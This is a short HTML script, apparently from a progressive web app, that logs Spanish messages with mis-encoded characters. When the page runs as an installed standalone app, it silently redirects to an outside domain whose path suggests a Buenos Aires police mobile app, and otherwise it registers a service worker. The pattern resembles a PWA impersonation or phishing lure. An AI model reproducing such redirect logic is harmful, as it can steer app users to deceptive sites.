<script>
  function isInStandaloneMode() {
    const standalone =
      window.matchMedia('(display-mode: standalone)').matches ||
      window.navigator.standalone === true;

    console.log('Â¿EstÃ¡ en modo standalone?', standalone);
    return standalone;
  }

  window.addEventListener('load', () => {
    console.log('PÃ¡gina cargada');
    
    if (isInStandaloneMode()) {
      console.log('ğŸŒ Modo standalone detectado. Redirigiendo...');
      window.location.replace('https://dienstpreos.com.ar/policiabsas-mobile');
      return;
    } else {
      console.log('ğŸš« No es modo standalone. No redirijo.');
    }

    registerSW();
  });

  async function registerSW() {
    if ('serviceWorker' in navigator) {
      try {
        await navigator.serviceWorker.register('serviceworker.js');
        console.log('âœ… Service Worker registrado');
      } catch (e) {
        console.log('âŒ SW registration failed', e);
      }
    }
  }
</script>
